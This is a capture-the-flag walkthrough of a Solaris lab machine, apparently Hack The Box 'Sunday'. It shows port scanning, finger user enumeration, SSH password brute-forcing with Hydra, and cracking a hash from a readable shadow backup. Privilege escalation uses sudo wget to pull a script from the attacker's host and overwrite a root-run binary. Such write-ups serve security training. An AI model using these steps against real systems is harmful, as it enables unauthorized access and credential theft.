# Reconnaissance

`nmap -sT -Pn -p- -T4 -v -oA scans/nmap_tcp_ports 10.129.188.80`

```
# Nmap 7.91 scan initiated Wed Aug 18 16:56:58 2021 as: nmap -sT -p- -T4 -A -v -oA nmap_tcp_ports 10.129.188.80
Warning: 10.129.188.80 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.129.188.80
Host is up (0.081s latency).
Not shown: 63187 closed ports, 2343 filtered ports
PORT      STATE SERVICE VERSION
79/tcp    open  finger  Sun Solaris fingerd
|_finger: No one logged on\x0D
111/tcp   open  rpcbind 2-4 (RPC #100000)
22022/tcp open  ssh     SunSSH 1.3 (protocol 2.0)
| ssh-hostkey: 
|   1024 d2:e5:cb:bd:33:c7:01:31:0b:3c:63:d9:82:d9:f1:4e (DSA)
|_  1024 e4:2c:80:62:cf:15:17:79:ff:72:9d:df:8b:a6:c9:ac (RSA)
62378/tcp open  unknown
62550/tcp open  rpcbind
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=8/18%OT=79%CT=1%CU=32047%PV=Y%DS=2%DC=T%G=Y%TM=611D28D
OS:9%P=x86_64-pc-linux-gnu)SEQ(SP=9C%GCD=1%ISR=A5%TI=I%CI=I%II=I%SS=S%TS=7)
OS:SEQ(CI=I)SEQ(SP=8F%GCD=1%ISR=A4%TI=I%CI=I%TS=7)OPS(O1=NNT11M54BNW0NNS%O2
OS:=NNT11M54BNW0NNS%O3=NNT11M54BNW0%O4=NNT11M54BNW0NNS%O5=NNT11M54BNW0NNS%O
OS:6=NNT11M54BNNS)WIN(W1=C21B%W2=C21B%W3=C1CC%W4=C068%W5=C068%W6=C0B7)ECN(R
OS:=Y%DF=Y%T=3C%W=C3D7%O=M54BNW0NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=3C%S=O%A=S+%F=AS%
OS:RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y
OS:%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R
OS:%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=Y%T=FF%IPL=70%UN=0%RIPL=G%RID=G%RIPCK=G%RUC
OS:K=G%RUD=G)IE(R=Y%DFI=Y%T=FF%CD=S)

Uptime guess: 0.401 days (since Wed Aug 18 07:59:02 2021)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=154 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: OS: Solaris; CPE: cpe:/o:sun:sunos

TRACEROUTE (using proto 1/icmp)
HOP RTT      ADDRESS
1   69.15 ms 10.10.16.1
2   35.61 ms 10.129.188.80

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Aug 18 17:35:53 2021 -- 1 IP address (1 host up) scanned in 2335.53 seconds

```

A scan for UDP was aborded as it showed a required time more than 4 hours for a complete scan.

```
sudo nmap -vv --reason -Pn -sV -p 79 --script="banner,finger" -oA tcp_79_nmap 10.129.188.80
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-18 19:49 CEST
NSE: Loaded 47 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 19:49
Completed NSE at 19:49, 0.00s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 19:49
Completed NSE at 19:49, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 19:49
Completed Parallel DNS resolution of 1 host. at 19:49, 0.01s elapsed
Initiating SYN Stealth Scan at 19:49
Scanning 10.129.188.80 [1 port]
Discovered open port 79/tcp on 10.129.188.80
Completed SYN Stealth Scan at 19:49, 0.08s elapsed (1 total ports)
Initiating Service scan at 19:49
Scanning 1 service on 10.129.188.80
Completed Service scan at 19:49, 8.45s elapsed (1 service on 1 host)
NSE: Script scanning 10.129.188.80.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 19:49
Completed NSE at 19:50, 10.52s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 19:50
Completed NSE at 19:50, 0.00s elapsed
Nmap scan report for 10.129.188.80
Host is up, received user-set (0.048s latency).
Scanned at 2021-08-18 19:49:50 CEST for 19s

PORT   STATE SERVICE REASON         VERSION
79/tcp open  finger  syn-ack ttl 59 Sun Solaris fingerd
|_finger: No one logged on\x0D
Service Info: OS: Solaris; CPE: cpe:/o:sun:sunos

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 19:50
Completed NSE at 19:50, 0.00s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 19:50
Completed NSE at 19:50, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.87 seconds
           Raw packets sent: 1 (44B) | Rcvd: 1 (44B)
```

```
git clone https://github.com/danielmiessler/SecLists.git
```

```
git clone https://github.com/pentestmonkey/finger-user-enum.git
```


```
./finger-user-enum.pl -U /usr/share/SecLists/Usernames/Names/names.txt -t 10.129.188.80 -v -m 20 | tee tcp_79_finger_usernames.txt
```


```
Starting finger-user-enum v1.0 ( http://pentestmonkey.net/tools/finger-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Worker Processes ......... 20
Usernames file ........... /usr/share/SecLists/Usernames/Names/names.txt
Target count ............. 1
Username count ........... 10177
Target TCP port .......... 79
Relay Server ............. Not used

######## Scan started at Wed Aug 18 20:07:36 2021 #########
access@10.129.188.80: access No Access User                     < .  .  .  . >..nobody4  SunOS 4.x NFS Anonym               < .  .  .  . >..
admin@10.129.188.80: Login       Name               TTY         Idle    When    Where..adm      Admin                              < .  .  .  . >..lp       Line Printer Admin                 < .  .  .  . >..uucp     uucp Admin                         < .  .  .  . >..nuucp    uucp Admin                         < .  .  .  . >..dladm    Datalink Admin                     < .  .  .  . >..listen   Network Admin                      < .  .  .  . >..
anne marie@10.129.188.80: Login       Name               TTY         Idle    When    Where..anne                  ???..marie                 ???..
bin@10.129.188.80: bin             ???                         < .  .  .  . >..
dee dee@10.129.188.80: Login       Name               TTY         Idle    When    Where..dee                   ???..dee                   ???..
jo ann@10.129.188.80: Login       Name               TTY         Idle    When    Where..jo                    ???..ann                   ???..
la verne@10.129.188.80: Login       Name               TTY         Idle    When    Where..la                    ???..verne                 ???..
line@10.129.188.80: Login       Name               TTY         Idle    When    Where..lp       Line Printer Admin                 < .  .  .  . >..
message@10.129.188.80: Login       Name               TTY         Idle    When    Where..smmsp    SendMail Message Sub               < .  .  .  . >..
miof mela@10.129.188.80: Login       Name               TTY         Idle    When    Where..miof                  ???..mela                  ???..
┌─[bernhard@parrot]─[~/git/finger-user-enum]
└──╼ $cat tcp_79_finger_usernames.txt | grep -v "no such user" | grep -v "timeout"
Starting finger-user-enum v1.0 ( http://pentestmonkey.net/tools/finger-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Worker Processes ......... 20
Usernames file ........... /usr/share/SecLists/Usernames/Names/names.txt
Target count ............. 1
Username count ........... 10177
Target TCP port .......... 79
Relay Server ............. Not used

######## Scan started at Wed Aug 18 20:07:36 2021 #########
access@10.129.188.80: access No Access User                     < .  .  .  . >..nobody4  SunOS 4.x NFS Anonym               < .  .  .  . >..
admin@10.129.188.80: Login       Name               TTY         Idle    When    Where..adm      Admin                              < .  .  .  . >..lp       Line Printer Admin                 < .  .  .  . >..uucp     uucp Admin                         < .  .  .  . >..nuucp    uucp Admin                         < .  .  .  . >..dladm    Datalink Admin                     < .  .  .  . >..listen   Network Admin                      < .  .  .  . >..
anne marie@10.129.188.80: Login       Name               TTY         Idle    When    Where..anne                  ???..marie                 ???..
bin@10.129.188.80: bin             ???                         < .  .  .  . >..
dee dee@10.129.188.80: Login       Name               TTY         Idle    When    Where..dee                   ???..dee                   ???..
jo ann@10.129.188.80: Login       Name               TTY         Idle    When    Where..jo                    ???..ann                   ???..
la verne@10.129.188.80: Login       Name               TTY         Idle    When    Where..la                    ???..verne                 ???..
line@10.129.188.80: Login       Name               TTY         Idle    When    Where..lp       Line Printer Admin                 < .  .  .  . >..
message@10.129.188.80: Login       Name               TTY         Idle    When    Where..smmsp    SendMail Message Sub               < .  .  .  . >..
miof mela@10.129.188.80: Login       Name               TTY         Idle    When    Where..miof                  ???..mela                  ???..
root@10.129.188.80: root     Super-User            pts/3        <Apr 24, 2018> sunday              ..
sammy@10.129.188.80: sammy                 console      <Oct 10, 2020>..
sunny@10.129.188.80: sunny                 pts/3        <Apr 24, 2018> 10.10.14.4          ..
zsa zsa@10.129.188.80: Login       Name               TTY         Idle    When    Where..zsa                   ???..zsa                   ???..
######## Scan completed at Wed Aug 18 20:15:11 2021 #########
14 results.

10177 queries in 455 seconds (22.4 queries / sec)
```


Two interesting findings:

```
sammy@10.129.188.80: sammy                 console      <Oct 10, 2020>..
sunny@10.129.188.80: sunny                 pts/3        <Apr 24, 2018> 10.10.14.4          ..
```

```
└──╼ $hydra -l sunny -P /usr/share/SecLists/Passwords/Common-Credentials/10k-most-common.txt -t 32 10.129.188.80 ssh -s 22022
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-08-18 21:04:30
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 32 tasks per 1 server, overall 32 tasks, 10000 login tries (l:1/p:10000), ~313 tries per task
[DATA] attacking ssh://10.129.188.80:22022/
[STATUS] 441.00 tries/min, 441 tries in 00:01h, 9590 to do in 00:22h, 32 active
[STATUS] 338.67 tries/min, 1016 tries in 00:03h, 9015 to do in 00:27h, 32 active
[ERROR] ssh target does not support password auth
[22022][ssh] host: 10.129.188.80   login: sunny   password: sunday
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 31 final worker threads did not complete until end.
[ERROR] 31 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-08-18 21:08:27
```


```
[22022][ssh] host: 10.129.188.80   login: sunny   password: sunday
```


# Initial Foothold

```
└──╼ $ssh -p 22022 sunny@10.129.188.80
Unable to negotiate with 10.129.188.80 port 22022: no matching key exchange method found. Their offer: gss-group1-sha1-toWM5Slw5Ew8Mqkay+al2g==,diffie-hellman-group-exchange-sha1,diffie-hellman-group1-sha1


└──╼ $ssh -p 22022 -oKexAlgorithms=+diffie-hellman-group1-sha1 sunny@10.129.188.80
The authenticity of host '[10.129.188.80]:22022 ([10.129.188.80]:22022)' can't be established.
RSA key fingerprint is SHA256:TmRO9yKIj8Rr/KJIZFXEVswWZB/hic/jAHr78xGp+YU.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.129.188.80]:22022' (RSA) to the list of known hosts.
Password: 
Last login: Thu Aug 19 00:38:42 2021 from 10.10.17.226
Sun Microsystems Inc.   SunOS 5.11      snv_111b        November 2008
sunny@sunday:~$ 
```


```
sunny@sunday:~$ ls
Desktop  Documents  Downloads  local.cshrc  local.login  local.profile  Public
sunny@sunday:~$ cd Desktop
sunny@sunday:~/Desktop$ ls
addmoresoftware.desktop  opensolaris-next-steps.desktop  register-opensolaris.desktop
sunny@sunday:~/Desktop$ find
.
./addmoresoftware.desktop
./register-opensolaris.desktop
./opensolaris-next-steps.desktop
./.os-icons-installed
sunny@sunday:~/Desktop$ ls /home/   
sunny@sunday:~/Desktop$ pwd
/export/home/sunny/Desktop
sunny@sunday:~/Desktop$ ls /export/home
sammy  sunny
sunny@sunday:~/Desktop$ ls /export/home/sammy
Desktop  Documents  Downloads  Public
sunny@sunday:~/Desktop$ ls /export/home/sammy/Desktop
user.txt
sunny@sunday:~/Desktop$ cd /export/home/sammy/Desktop/
sunny@sunday:/export/home/sammy/Desktop$ cat user.txt
cat: user.txt: Permission denied
```

```
sunny@sunday:~$ sudo -l
User sunny may run the following commands on this host:
    (root) NOPASSWD: /root/troll
sunny@sunday:~$ sudo /root/troll 
testing
uid=0(root) gid=0(root)
```

```
sunny@sunday:/export/home/sammy/Desktop$ cd /
sunny@sunday:/$ ls
backup  bin  boot  cdrom  dev  devices  etc  export  home  kernel  lib  lost+found  media  mnt  net  opt  platform  proc  root  rpool  sbin  system  tmp  usr  var
sunny@sunday:/$ cd backup
sunny@sunday:/backup$ ls
agent22.backup  shadow.backup
sunny@sunday:/backup$ cat agent22.backup 
cat: agent22.backup: Permission denied
sunny@sunday:/backup$ ls -lh             
total 2,0K
-r-x--x--x 1 root root  53 2018-04-24 10:35 agent22.backup
-rw-r--r-- 1 root root 319 2018-04-15 20:44 shadow.backup

sunny@sunday:/backup$ cat shadow.backup 
mysql:NP:::::::
openldap:*LK*:::::::
webservd:*LK*:::::::
postgres:NP:::::::
svctag:*LK*:6445::::::
nobody:*LK*:6445::::::
noaccess:*LK*:6445::::::
nobody4:*LK*:6445::::::
sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::
sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::
```


```
└──╼ $cat sammy-hash.txt 
$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB

└──╼ $john --wordlist=/usr/share/wordlists/rockyou.txt sammy-hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (sha256crypt, crypt(3) $5$ [SHA256 128/128 SSE2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
cooldude!        (?)
1g 0:00:01:44 DONE (2021-08-19 06:51) 0.009557g/s 1947p/s 1947c/s 1947C/s domonique1..chrystelle
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

```
sunny@sunday:/backup$ su - sammy    
Password: 
Sun Microsystems Inc.   SunOS 5.11      snv_111b        November 2008
sammy@sunday:~$ 
sammy@sunday:~$ ls   
Desktop  Documents  Downloads  Public
sammy@sunday:~$ cd Desktop           
sammy@sunday:~/Desktop$ cat user.txt
a3d949**************************
sammy@sunday:~/Desktop$ 
```

```
sammy@sunday:~/Desktop$ sudo -l
User sammy may run the following commands on this host:
    (root) NOPASSWD: /usr/bin/wget
```

on attacker machine
```
└──╼ $cat troll 
#!/usr/bin/bash

/usr/bin/bash

```

as user sammy
```
sammy@sunday:~$ sudo wget http://10.10.17.226:4444/troll -O /root/troll
--10:43:21--  http://10.10.17.226:4444/troll
           => `/root/troll'
Connecting to 10.10.17.226:4444... connected.
HTTP request sent, awaiting response... 200 OK
Length: 31 [application/octet-stream]

100%[============================================================>] 31            --.--K/s             

10:43:21 (3.05 MB/s) - `/root/troll' saved [31/31]

```

as user sunny
```
└──╼ $ssh -p 22022 -oKexAlgorithms=+diffie-hellman-group1-sha1 sunny@10.129.188.80
Password: 
Last login: Thu Aug 19 09:59:16 2021 from 10.10.17.226
Sun Microsystems Inc.   SunOS 5.11      snv_111b        November 2008
sunny@sunday:~$ sudo /root/troll
testing
uid=0(root) gid=0(root)
sunny@sunday:~$ sudo -l
User sunny may run the following commands on this host:
    (root) NOPASSWD: /root/troll
sunny@sunday:~$ sudo /root/troll
testing
uid=0(root) gid=0(root)
sunny@sunday:~$ sudo /root/troll
root@sunday:~# cat /root/root.txt
fb40fa**************************

```


https://0xdf.gitlab.io/2018/09/29/htb-sunday.html shows examples what else could be overwritten.

